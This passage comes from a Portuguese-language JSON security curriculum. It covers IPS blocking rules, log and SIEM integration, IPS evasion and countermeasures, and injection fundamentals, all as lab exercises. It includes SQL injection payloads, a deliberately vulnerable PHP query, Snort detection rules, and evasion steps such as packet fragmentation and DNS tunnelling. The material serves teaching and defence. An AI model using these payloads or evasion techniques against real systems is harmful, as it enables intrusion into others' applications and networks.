                                "Programação: Scripts Python para automação de testes",
                                "Gestão de Projetos: Planejamento e iteração ágil",
                                "Ética: Considerações de privacidade em monitoramento"
                              ],
                              "realWorldApplication": "Em centros de operações de segurança (SOCs) de empresas como bancos ou e-commerces, regras híbridas em IPS como Palo Alto ou Cisco Firepower detectam APTs avançadas, reduzindo tempo de resposta de dias para minutos e minimizando breaches financeiras."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.3.4.2.1",
                              "10.1.3.4.2.2"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.3.4.3",
                        "name": "Mecanismos de Prevenção e Bloqueio",
                        "description": "Ações proativas do IPS para bloquear intrusões detectadas e mitigar riscos.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.4.3.1",
                            "name": "Implementar bloqueio ativo de tráfego malicioso",
                            "description": "Configurar respostas automáticas como drop de pacotes, reset de conexões TCP e blacklisting de IPs fontes.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o Ambiente e Configurar o IPS Base",
                                  "subSteps": [
                                    "Instalar e configurar um IPS open-source como Snort ou Suricata em um ambiente de laboratório virtualizado (ex: VirtualBox com Ubuntu).",
                                    "Atualizar regras de detecção existentes para incluir assinaturas de tráfego malicioso comuns (ex: exploits SQL injection, scans de portas).",
                                    "Habilitar modo inline para que o IPS possa inspecionar e modificar tráfego em tempo real.",
                                    "Configurar logging detalhado para ações de bloqueio em /var/log/snort/alert.",
                                    "Definir políticas básicas de whitelist para tráfego legítimo."
                                  ],
                                  "verification": "Verificar se o IPS está rodando em modo inline com 'sudo snort -T -c /etc/snort/snort.conf' sem erros e logs sendo gerados.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Máquina virtual Ubuntu 20.04, Snort/Suricata instalado, interface de rede em bridge mode.",
                                  "tips": "Use containers Docker para simular rapidamente o ambiente sem poluir a VM principal.",
                                  "learningObjective": "Compreender e preparar a infraestrutura necessária para bloqueio ativo.",
                                  "commonMistakes": "Esquecer de desabilitar firewall host (ufw/iptables) que interfere com o tráfego inline."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Drop de Pacotes para Tráfego Malicioso",
                                  "subSteps": [
                                    "Criar regra customizada no arquivo de regras do IPS: 'drop tcp any any -> $HOME_NET 80 (msg:\"SQL Injection\"; content:\"1' OR '1'=\"1\"; sid:1000001;)'.",
                                    "Recarregar regras com 'sudo snort -T -c /etc/snort/snort.conf'.",
                                    "Simular tráfego malicioso com ferramentas como nmap ou curl enviando payloads detectados.",
                                    "Monitorar logs para confirmar drops: grep 'Drop' /var/log/snort/alert.",
                                    "Ajustar thresholds para evitar falsos positivos."
                                  ],
                                  "verification": "Enviar payload malicioso e confirmar ausência de resposta no Wireshark, com log de drop no IPS.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Editor de texto (nano/vim), Wireshark instalado na VM atacante, arquivo de regras Snort.",
                                  "tips": "Teste regras em modo alert primeiro antes de drop para depuração.",
                                  "learningObjective": "Implementar drop stateless de pacotes baseado em assinaturas.",
                                  "commonMistakes": "Regras com sintaxe errada causando falha no reload; usar 'alert' em vez de 'drop' por engano."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Reset de Conexões TCP",
                                  "subSteps": [
                                    "Adicionar suporte a TCP reset nas regras: 'drop tcp any any -> $HOME_NET any (msg:\"Port Scan\"; flags:S,12; threshold:type both, track by_src, count 5, seconds 60; react; sid:1000002;)'.",
                                    "Habilitar módulo 'react' ou 'responsive' no snort.conf.",
                                    "Configurar templates de resposta RST para o IPS enviar de volta.",
                                    "Testar com scan de portas SYN flood simulado.",
                                    "Verificar estatísticas com 'sudo snort -T' e logs de resets enviados."
                                  ],
                                  "verification": "Capturar tráfego no Wireshark e ver pacotes RST sendo enviados pelo IPS para o atacante.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "Wireshark, hping3 para simular floods TCP, snort.conf editável.",
                                  "tips": "Ajuste TTL nos resets para mascarar o IP do IPS.",
                                  "learningObjective": "Configurar respostas ativas TCP para abortar conexões suspeitas.",
                                  "commonMistakes": "Módulo react não compilado no Snort; floods sobrecarregando o sistema sem thresholds."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar Blacklisting Dinâmico de IPs Fontes",
                                  "subSteps": [
                                    "Integrar script Python ou usar sfblacklist para adicionar IPs a uma lista negra dinâmica via iptables: 'iptables -I INPUT -s $BAD_IP -j DROP'.",
                                    "Criar regra IPS que triggera blacklist após N violações: 'drop tcp any any -> $HOME_NET 443 (msg:\"Brute Force\"; flow:to_server,established; content:\"POST\"; threshold:type limit, track by_src, count 10, seconds 300; sid:1000003; tag:src,10,seconds;)'.",
                                    "Automação com cron job para limpar lista negra após 1h.",
                                    "Testar injetando tráfego de um IP simulado múltiplas vezes.",
                                    "Monitorar com 'iptables -L -n | grep DROP'."
                                  ],
                                  "verification": "IP atacante aparece em blacklist após threshold e tráfego subsequente é dropado permanentemente.",
                                  "estimatedTime": "50 minutos",
                                  "materials": "Python3, iptables, script sfblacklist ou custom, nmap para simulação.",
                                  "tips": "Use variáveis de ambiente para HOME_NET para escalabilidade.",
                                  "learningObjective": "Automatizar blacklisting persistente baseado em comportamento.",
                                  "commonMistakes": "Sem cleanup levando a lista negra infinita; falha em track by_src."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar, Monitorar e Otimizar o Bloqueio Ativo",
                                  "subSteps": [
                                    "Executar cenários de teste: exploit, DDoS simulado, tráfego legítimo.",
                                    "Analisar performance com top/htop e tuning de CPU/threads no IPS.",
                                    "Configurar alertas via email/Slack para bloqueios acionados.",
                                    "Revisar falsos positivos/negativos e refinar regras.",
                                    "Documentar configuração em README para replicação."
                                  ],
                                  "verification": "Relatório de testes mostrando 100% bloqueio de malicioso sem impacto em legítimo.",
                                  "estimatedTime": "35 minutos",
                                  "materials": "Ferramentas de teste (Metasploit community, hping3), ELK stack opcional para logs.",
                                  "tips": "Use tcpreplay para replay de pcaps reais de ataques.",
                                  "learningObjective": "Validar eficácia e sustentabilidade do sistema de bloqueio.",
                                  "commonMistakes": "Sobrecarga de CPU por logging excessivo; ignorar falsos positivos."
                                }
                              ],
                              "practicalExample": "Em um laboratório com duas VMs (atacante Kali Linux e vítima Ubuntu com Snort inline), configure regras para detectar e dropar payloads de SQL injection em tráfego HTTP para um servidor web Apache. Simule ataque com sqlmap, observe drops e RSTs no Wireshark, e blacklist o IP do Kali após 5 tentativas, impedindo acesso subsequente.",
                              "finalVerifications": [
                                "IPS detecta e dropa 100% dos pacotes maliciosos simulados.",
                                "Conexões TCP são resetadas com RST visíveis no Wireshark.",
                                "IPs fontes são automaticamente adicionados à blacklist iptables.",
                                "Logs detalhados registram todas ações sem erros.",
                                "Tráfego legítimo passa inalterado (teste ping/HTTP normal).",
                                "Sistema permanece estável sob carga moderada (1000 pkts/s)."
                              ],
                              "assessmentCriteria": [
                                "Precisão das regras: 0 falsos positivos em 50 testes mistos.",
                                "Tempo de resposta: Bloqueio em <1s para detecções.",
                                "Automação funcional: Blacklist triggera e expira corretamente.",
                                "Documentação: README com regras e passos de deploy.",
                                "Otimização: Uso de CPU <50% em testes de estresse.",
                                "Resiliência: Recuperação automática após reinício do IPS."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Compreensão profunda de protocolos TCP/IP e Wireshark.",
                                "Programação: Scripts Python para automação de blacklists.",
                                "Análise de Dados: Processamento de logs com ELK ou Splunk.",
                                "Ética em TI: Discussão sobre privacidade em blacklisting.",
                                "Sistemas Operacionais: Gerenciamento avançado de iptables/ufw."
                              ],
                              "realWorldApplication": "Em data centers empresariais, esse bloqueio ativo protege contra ataques zero-day em firewalls next-gen como Palo Alto ou Cisco Firepower, mitigando DDoS, exploits e scans automatizados, reduzindo tempo de resposta de horas para segundos e minimizando downtime em e-commerces ou bancos."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.3.4.1.2"
                            ]
                          },
                          {
                            "id": "10.1.3.4.3.2",
                            "name": "Gerenciar alertas e logs de eventos",
                            "description": "Configurar geração de logs detalhados, alertas em tempo real e integração com SIEM para análise forense.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Geração de Logs Detalhados no IPS",
                                  "subSteps": [
                                    "Identifique os eventos críticos a serem logados (ex.: tentativas de intrusão, bloqueios de pacotes).",
                                    "Acesse a configuração do IPS via CLI ou interface web (ex.: Snort ou Suricata).",
                                    "Ative logging em níveis verbose para capturar timestamps, IPs fonte/destino, payloads e regras acionadas.",
                                    "Defina rotação de logs e armazenamento em formato estruturado (JSON ou Syslog).",
                                    "Teste inicial gerando tráfego simulado e verificando arquivos de log."
                                  ],
                                  "verification": "Verifique se logs detalhados são gerados em /var/log/ips com informações completas de um evento simulado.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "IPS tool (Snort/Suricata), servidor Linux, editor de config (nano/vim), ferramenta de geração de tráfego (hping3).",
                                  "tips": "Use níveis de log rotativos para evitar overflow de disco; priorize eventos de alta criticidade.",
                                  "learningObjective": "Entender e implementar configuração de logging granular para captura de evidências.",
                                  "commonMistakes": "Esquecer de ativar logging para regras personalizadas; configurar paths de log inexistentes."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Alertas em Tempo Real",
                                  "subSteps": [
                                    "Defina thresholds para alertas baseados em severidade (ex.: >5 tentativas em 1min).",
                                    "Configure saídas de alerta via email, SNMP ou API webhook no IPS.",
                                    "Integre com ferramentas de notificação (ex.: Slack ou PagerDuty via scripts).",
                                    "Teste alertas com ataques simulados (ex.: nmap scan).",
                                    "Ajuste falsos positivos reduzindo sensibilidade em regras."
                                  ],
                                  "verification": "Simule um evento e confirme receipt de alerta em destino configurado dentro de 10 segundos.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "IPS configurado, servidor SMTP/SNMP, simulador de ataques (Metasploit/nmap), conta de email/Slack.",
                                  "tips": "Implemente debounce para evitar spam de alertas; use templates personalizados para clareza.",
                                  "learningObjective": "Criar sistema de notificação proativa para resposta rápida a ameaças.",
                                  "commonMistakes": "Thresholds muito baixos causando alertas excessivos; falha em autenticação de notificações."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Integrar Logs e Alertas com SIEM",
                                  "subSteps": [
                                    "Instale agente forwarder (ex.: Filebeat ou rsyslog) no host IPS.",
                                    "Configure parsing de logs para campos estruturados (timestamp, src_ip, rule_id).",
                                    "Crie dashboard no SIEM (ex.: ELK Stack ou Splunk) para visualização de logs/alertas.",
                                    "Defina correlação de eventos entre IPS e outras fontes (firewall, endpoint).",
                                    "Valide fluxo end-to-end enviando logs para SIEM."
                                  ],
                                  "verification": "Confirme logs do IPS aparecendo em dashboard SIEM com parsing correto em <5min.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "SIEM (ELK/Splunk), Filebeat/rsyslog, rede interna para forward seguro.",
                                  "tips": "Use TLS para transmissão segura de logs; indexe apenas campos relevantes para performance.",
                                  "learningObjective": "Estabelecer pipeline de dados centralizado para monitoramento unificado.",
                                  "commonMistakes": "Parsing incorreto de formatos custom; sobrecarga de SIEM sem filtros."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar Análise Forense e Retenção",
                                  "subSteps": [
                                    "Defina políticas de retenção (ex.: 90 dias para logs críticos).",
                                    "Crie queries no SIEM para reconstrução de timelines de incidentes.",
                                    "Integre com ferramentas forenses (ex.: export para Wireshark ou Volatility).",
                                    "Automatize relatórios de incidentes via scheduled searches.",
                                    "Teste recuperação de log para um incidente simulado."
                                  ],
                                  "verification": "Execute query forense e gere relatório timeline completo de evento testado.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "SIEM com queries, Wireshark, scripts de automação (Python/Kibana).",
                                  "tips": "Hash logs para chain of custody; use cold storage para retenção longa.",
                                  "learningObjective": "Preparar dados para investigação pós-incidente com integridade.",
                                  "commonMistakes": "Retenção insuficiente violando compliance; queries ineficientes lentas."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar e Otimizar o Sistema Completo",
                                  "subSteps": [
                                    "Execute cenários de teste (ataque realista, falha de disco).",
                                    "Monitore performance (CPU, disco, latência de alertas).",
                                    "Ajuste baseados em métricas (reduzir falsos positivos).",
                                    "Documente procedimentos de troubleshooting.",
                                    "Realize drill de resposta simulada."
                                  ],
                                  "verification": "Sistema responde a 100% dos testes com logs/alertas corretos e zero downtime.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Ambiente de lab, ferramentas de monitoramento (top/Prometheus).",
                                  "tips": "Automatize testes com Ansible/ scripts; revise semanalmente.",
                                  "learningObjective": "Validar robustez e eficiência do gerenciamento de alertas/logs.",
                                  "commonMistakes": "Ignorar tuning pós-teste; testes não realistas."
                                }
                              ],
                              "practicalExample": "Em um lab com Suricata IPS e ELK SIEM: Configure rules para detectar SQL injection, gere log detalhado de ataque simulado via sqlmap, envie alerta Slack em tempo real, visualize timeline no Kibana e exporte para Wireshark análise forense.",
                              "finalVerifications": [
                                "Logs detalhados capturam todos os campos essenciais (IP, payload, rule) sem perda.",
                                "Alertas disparam em <10s para eventos threshold e integram com SIEM.",
                                "SIEM dashboard mostra correlação de eventos IPS com outras fontes.",
                                "Query forense reconstrói incidente completo com evidências íntegras.",
                                "Sistema mantém performance sob carga (teste com 1000 eventos/min).",
                                "Políticas de retenção e backup validadas com recuperação bem-sucedida."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração: 100% dos eventos logados corretamente.",
                                "Tempo de resposta: Alertas em tempo real (<15s end-to-end).",
                                "Qualidade de integração: Parsing e visualização sem erros no SIEM.",
                                "Robustez forense: Reconstrução de incidentes com chain of custody.",
                                "Eficiência: Uso de recursos <70% CPU/disco em testes de carga.",
                                "Documentação: Procedimentos claros para troubleshooting."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Dados: Queries e dashboards no SIEM (SQL/ELK Query Language).",
                                "Programação: Scripts Python para automação de alertas e parsing.",
                                "Redes: Entendimento profundo de protocolos e tráfego (TCP/IP, Wireshark).",
                                "Gestão de Incidentes: Mapeamento para NIST IR ou MITRE ATT&CK.",
                                "Compliance: Alinhamento com LGPD/GDPR para retenção de logs."
                              ],
                              "realWorldApplication": "Em um SOC de uma empresa, gerenciar alertas de IPS detecta ransomware em tempo real, integra com SIEM para triagem, permite análise forense rápida e bloqueio automatizado, reduzindo MTTR de dias para horas e minimizando danos financeiros."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.4.3.3",
                            "name": "Avaliar evasão de IPS e contramedidas",
                            "description": "Identificar técnicas de evasão como fragmentação, criptografia e tunelamento, e configurar defesas como normalização de pacotes.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar técnicas comuns de evasão de IPS",
                                  "subSteps": [
                                    "Estude fragmentação de pacotes: divida payloads em fragmentos para evitar detecção de assinatura.",
                                    "Analise criptografia: entenda como SSL/TLS ou VPNs ocultam tráfego malicioso.",
                                    "Explore tunelamento: revise protocolos como DNS, HTTP ou ICMP usados para encapsular payloads evasivos.",
                                    "Liste variações como evasão de TTL ou sobrecarga de pacotes.",
                                    "Crie um mapa mental conectando cada técnica ao mecanismo de evasão no IPS."
                                  ],
                                  "verification": "Crie um documento listando 5 técnicas com exemplos e explique como cada uma evade IPS.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Documentação de IPS (Snort, Suricata)",
                                    "Wireshark para captura de pacotes",
                                    "Artigos sobre evasão (ex: OWASP, SANS)"
                                  ],
                                  "tips": "Use diagramas visuais para ilustrar fragmentação e tunelamento; foque em exemplos reais de ataques como EternalBlue.",
                                  "learningObjective": "Compreender os princípios e exemplos de técnicas de evasão de IPS.",
                                  "commonMistakes": [
                                    "Confundir fragmentação com ofuscação",
                                    "Ignorar impacto de criptografia pós-quantum",
                                    "Subestimar tunelamento em protocolos legítimos"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Simular evasão de IPS em ambiente controlado",
                                  "subSteps": [
                                    "Configure um lab com VM: instale IPS (ex: Snort) e gere tráfego simulado.",
                                    "Teste fragmentação: use ferramentas como fragroute ou Scapy para fragmentar pacotes maliciosos.",
                                    "Simule criptografia: envie tráfego HTTPS com payloads maliciosos via nmap ou Metasploit.",
                                    "Implemente tunelamento: tunnel payloads via dns2tcp ou iodine.",
                                    "Registre logs do IPS para observar falhas de detecção."
                                  ],
                                  "verification": "Capture e analise logs mostrando evasão bem-sucedida em pelo menos 3 técnicas.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "VirtualBox/VMware",
                                    "Snort ou Suricata",
                                    "Scapy, fragroute, nmap, Metasploit",
                                    "Kali Linux VM"
                                  ],
                                  "tips": "Inicie com tráfego de baixa velocidade para depuração; isole o lab para evitar impactos reais.",
                                  "learningObjective": "Demonstrar praticamente como técnicas de evasão burlam IPS padrão.",
                                  "commonMistakes": [
                                    "Não isolar rede do lab",
                                    "Usar payloads reais sem sandbox",
                                    "Ignorar falsos positivos em simulações"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar contramedidas contra evasão",
                                  "subSteps": [
                                    "Habilite normalização de pacotes no IPS: configure regras para reassembly de fragmentos.",
                                    "Implemente inspeção pós-decriptografia: integre SSL bumping ou decoders para tunelamento.",
                                    "Ajuste detecção comportamental: adicione heurísticas para anomalias em TTL ou tamanhos de pacotes.",
                                    "Configure rate limiting e deep packet inspection (DPI) avançada.",
                                    "Teste configurações com regras personalizadas para cenários de evasão."
                                  ],
                                  "verification": "Aplique configurações e confirme bloqueio de tráfego evasivo simulado nos logs.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "IPS configurável (Snort com DAQ, Suricata)",
                                    "Documentação oficial de normalização",
                                    "Ferramentas de teste como hping3"
                                  ],
                                  "tips": "Backup configurações antes de alterações; priorize normalização para fragmentação como primeiro passo.",
                                  "learningObjective": "Implementar defesas técnicas contra evasão de IPS.",
                                  "commonMistakes": [
                                    "Configurações muito agressivas causando falsos positivos",
                                    "Esquecer reassembly em todos os protocolos",
                                    "Não testar pós-configuração"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Avaliar eficácia das contramedidas e otimizar",
                                  "subSteps": [
                                    "Execute testes repetidos: compare evasão antes/depois das contramedidas.",
                                    "Analise métricas: taxa de detecção, falsos positivos/negativos, latência.",
                                    "Monitore logs em tempo real durante simulações avançadas.",
                                    "Ajuste regras baseadas em resultados: refine heurísticas ou adicione novas.",
                                    "Documente relatório com recomendações para produção."
                                  ],
                                  "verification": "Gere relatório comprovando >90% de detecção em testes evasivos.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Ferramentas de análise (ELK Stack, Splunk free)",
                                    "Scripts de automação em Python/Scapy",
                                    "Planilhas para métricas"
                                  ],
                                  "tips": "Use automação para testes repetíveis; foque em cenários realistas de threat actors.",
                                  "learningObjective": "Avaliar e refinar defesas contra evasão de IPS.",
                                  "commonMistakes": [
                                    "Testes insuficientes",
                                    "Ignorar impacto na performance da rede",
                                    "Não documentar ajustes"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab, use Scapy para fragmentar um payload de exploit SMB (como WannaCry). Configure Snort sem normalização (evasão succeeds), então habilite reassembly (bloqueio confirmado via logs).",
                              "finalVerifications": [
                                "Identificar e explicar 5 técnicas de evasão com exemplos.",
                                "Simular evasão bem-sucedida em pelo menos 3 cenários.",
                                "Configurar normalização e demonstrar bloqueio de fragmentação.",
                                "Analisar logs mostrando eficácia das contramedidas.",
                                "Gerar relatório com métricas de detecção >85%.",
                                "Propor otimizações para cenários de produção."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de técnicas de evasão (90%+).",
                                "Correta simulação e logging de evasões.",
                                "Configuração sem erros de contramedidas.",
                                "Análise quantitativa de eficácia (métricas claras).",
                                "Relatório completo e acionável.",
                                "Criatividade em conexões com ameaças reais."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Protocolos TCP/IP e reassembly (CCNA).",
                                "Criptografia: Análise de SSL/TLS (Cryptography 101).",
                                "Programação: Scripts Scapy/Python para automação.",
                                "Análise de Malware: Evasão em payloads maliciosos.",
                                "Gestão de Riscos: Integração em frameworks como NIST."
                              ],
                              "realWorldApplication": "Em SOCs empresariais, configurar IPS com normalização para bloquear ataques fragmentados como em campanhas APT, reduzindo brechas em firewalls perimetrais e protegendo infra crítica."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.3.4.2.3"
                            ]
                          }
                        ]
                      }
                    ]
                  }
                ]
              },
              {
                "id": "10.1.4",
                "name": "Segurança Web",
                "description": "Discute ataques de injeção, XSS e CSRF.",
                "totalSkills": 40,
                "atomicTopics": [
                  {
                    "id": "10.1.4.1",
                    "name": "Ataques de Injeção",
                    "description": "Exploração de entradas não sanitizadas para inserir e executar comandos maliciosos, como SQL Injection.",
                    "individualConcepts": [
                      {
                        "id": "10.1.4.1.1",
                        "name": "Fundamentos de Ataques de Injeção",
                        "description": "Conceitos básicos sobre ataques de injeção, incluindo a exploração de entradas não sanitizadas para inserir comandos maliciosos em aplicações web.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.1.1.1",
                            "name": "Identificar entradas não sanitizadas",
                            "description": "Reconhecer pontos de entrada de dados do usuário em aplicações web que não realizam validação ou sanitização adequada, permitindo a injeção de código malicioso.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender entradas de usuário em aplicações web",
                                  "subSteps": [
                                    "Identifique tipos comuns de entradas: formulários HTML, parâmetros de URL, cookies e headers HTTP.",
                                    "Analise o fluxo de dados: de onde vêm as entradas (cliente) e para onde vão (servidor, banco de dados).",
                                    "Estude exemplos de apps web simples como login, busca e cadastro de usuário.",
                                    "Mapeie pontos de entrada em um diagrama básico de fluxo de aplicação.",
                                    "Diferencie entradas confiáveis (admin) de não confiáveis (usuário público)."
                                  ],
                                  "verification": "Crie um diagrama de fluxo mostrando pelo menos 4 pontos de entrada em uma app web fictícia.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação HTML forms",
                                    "Ferramenta de diagramação como Draw.io",
                                    "Exemplos de código PHP/Node.js"
                                  ],
                                  "tips": "Sempre pergunte: 'Essa entrada vem de um usuário não autenticado?'",
                                  "learningObjective": "Reconhecer e classificar todos os pontos de entrada de dados do usuário em apps web.",
                                  "commonMistakes": [
                                    "Confundir entradas internas (logs) com externas",
                                    "Ignorar parâmetros de URL como entradas",
                                    "Subestimar cookies como vetores de ataque"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Aprender validação e sanitização de dados",
                                  "subSteps": [
                                    "Defina validação: verificar formato e tipo (ex: email válido).",
                                    "Defina sanitização: remover ou escapar caracteres perigosos (ex: <script> para XSS).",
                                    "Estude técnicas: escaping SQL (PDO), HTML encoding, prepared statements.",
                                    "Compare código vulnerável vs. seguro: concatenação direta vs. parametrização.",
                                    "Liste bibliotecas comuns: OWASP ESAPI, htmlspecialchars() em PHP."
                                  ],
                                  "verification": "Explique a diferença entre validação e sanitização com 2 exemplos de código corrigido.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "OWASP Cheat Sheet para Injection Prevention",
                                    "Documentação PDO/MySQLi",
                                    "Editor de código como VS Code"
                                  ],
                                  "tips": "Lembre-se: validação rejeita inválido; sanitização torna seguro mesmo se inválido.",
                                  "learningObjective": "Diferenciar e exemplificar técnicas de validação e sanitização adequadas.",
                                  "commonMistakes": [
                                    "Confundir validação com sanitização",
                                    "Achar que whitelisting é suficiente sem escaping",
                                    "Usar funções depreciadas como mysql_real_escape_string"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar pontos comuns de entradas não sanitizadas",
                                  "subSteps": [
                                    "Procure por inputs diretos em queries SQL sem prepared statements.",
                                    "Verifique campos de formulário concatenados em HTML/JS sem encoding.",
                                    "Analise parâmetros GET/POST usados em comandos shell ou eval().",
                                    "Examine logs e headers processados sem filtro.",
                                    "Use ferramentas como grep para buscar padrões perigosos: 'echo $_GET' ou raw SQL concat."
                                  ],
                                  "verification": "Liste 5 pontos vulneráveis em um código-fonte fornecido.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Código-fonte vulnerável de DVWA ou bWAPP",
                                    "Editor de texto com busca regex",
                                    "Lista OWASP Top 10"
                                  ],
                                  "tips": "Busque por variáveis de usuário próximas a funções perigosas como query(), innerHTML.",
                                  "learningObjective": "Detectar padrões de código que indicam falta de sanitização em múltiplas linguagens.",
                                  "commonMistakes": [
                                    "Focar só em SQL, ignorar XSS ou command injection",
                                    "Não verificar fluxos assíncronos como AJAX",
                                    "Passar por alto funções como json_decode sem validação"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar análise de código real para identificação",
                                  "subSteps": [
                                    "Baixe um app web vulnerável e rode localmente (ex: DVWA).",
                                    "Inspecione o código-fonte de 3 módulos: login, search, profile.",
                                    "Anote entradas não sanitizadas e teste com payloads simples (ex: ' OR 1=1).",
                                    "Documente riscos potenciais para cada ponto identificado.",
                                    "Compare com versão corrigida e valide correções."
                                  ],
                                  "verification": "Gere um relatório com screenshots e payloads que confirmem vulnerabilidades.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "DVWA ou Juice Shop baixado",
                                    "Burp Suite Community ou browser dev tools",
                                    "Ambiente local XAMPP/WAMP"
                                  ],
                                  "tips": "Use dev tools do browser para inspecionar requests/responses em tempo real.",
                                  "learningObjective": "Aplicar identificação em cenários práticos e documentar achados.",
                                  "commonMistakes": [
                                    "Testar só com payloads complexos, ignorar básicos",
                                    "Não diferenciar false positives",
                                    "Esquecer de testar em múltiplos browsers"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um site de e-commerce, o campo de busca é processado assim: $query = \"SELECT * FROM products WHERE name LIKE '%\" . $_GET['q'] . \"%'\"; sem prepared statements, permitindo SQL injection como ' OR 1=1 --.",
                              "finalVerifications": [
                                "Identificar corretamente 80% dos pontos vulneráveis em um código de teste aleatório.",
                                "Explicar o risco específico (XSS, SQLi, etc.) para cada entrada não sanitizada.",
                                "Propor uma correção básica para pelo menos 3 vulnerabilidades identificadas.",
                                "Demonstrar com payload que explora a falta de sanitização.",
                                "Listar 5 pontos comuns de entradas não sanitizadas em apps modernas (React/PHP, etc.).",
                                "Criar um checklist pessoal para auditoria rápida de entradas."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação: zero falsos negativos em testes padrão.",
                                "Completude: cobre todos os tipos de entrada (HTTP methods, headers, etc.).",
                                "Profundidade de análise: liga falta de sanitização a vetores de ataque específicos.",
                                "Clareza na documentação: relatórios legíveis com evidências.",
                                "Criatividade em testes: usa payloads variados e ferramentas adequadas.",
                                "Conhecimento contextual: relaciona a OWASP Top 10 e boas práticas."
                              ],
                              "crossCurricularConnections": [
                                "Programação Web: Análise de código em linguagens como PHP, JavaScript, Python.",
                                "Banco de Dados: Entendimento de SQL/NoSQL e prepared statements.",
                                "Desenvolvimento Ágil: Integração de security checks em sprints.",
                                "Ética e Direito: Responsabilidades legais em breaches de dados (LGPD/GDPR).",
                                "Análise de Dados: Uso de logs para detectar padrões de ataques."
                              ],
                              "realWorldApplication": "Essa habilidade é crucial para auditores de segurança em empresas como bancos e e-commerces, prevenindo breaches como o Equifax (SQLi) ou Yahoo (XSS), economizando milhões em remediação e multas regulatórias."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.1.1.2",
                            "name": "Explicar o mecanismo de exploração",
                            "description": "Descrever como atacantes exploram falhas de sanitização para alterar a lógica de execução de comandos, como em consultas de banco de dados ou comandos do sistema.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos Básicos de Sanitização e Falhas",
                                  "subSteps": [
                                    "Defina sanitização como o processo de filtrar e validar entradas de usuário para prevenir injeções maliciosas.",
                                    "Identifique tipos comuns de entradas não sanitizadas: campos de formulário, parâmetros URL e inputs de API.",
                                    "Estude exemplos de falhas: concatenação direta de strings sem escaping ou validação.",
                                    "Analise o fluxo normal de uma aplicação web: entrada → processamento → execução de comando/query.",
                                    "Discuta por que sanitização é crítica para manter a integridade da lógica de execução."
                                  ],
                                  "verification": "Resuma em 3 frases o que é sanitização e liste 2 falhas comuns com exemplos.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação OWASP sobre Input Validation",
                                    "Vídeo introdutório sobre sanitização (YouTube: OWASP)"
                                  ],
                                  "tips": "Use analogias como 'sanitização é como lavar as mãos antes de cozinhar' para fixar o conceito.",
                                  "learningObjective": "Entender o papel da sanitização na prevenção de alterações na lógica de execução.",
                                  "commonMistakes": "Confundir sanitização com autenticação; ignorar que sanitização é por contexto (SQL vs. OS)."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Mecanismo de Exploração em SQL Injection",
                                  "subSteps": [
                                    "Examine uma query SQL vulnerável: SELECT * FROM users WHERE id = '",
                                    "Introduza payload malicioso: ' OR '1'='1 para burlar autenticação.",
                                    "Trace o fluxo: input não sanitizado fecha string prematuramente e injeta lógica booleana verdadeira.",
                                    "Demonstre execução alterada: retorna todos os usuários em vez de um.",
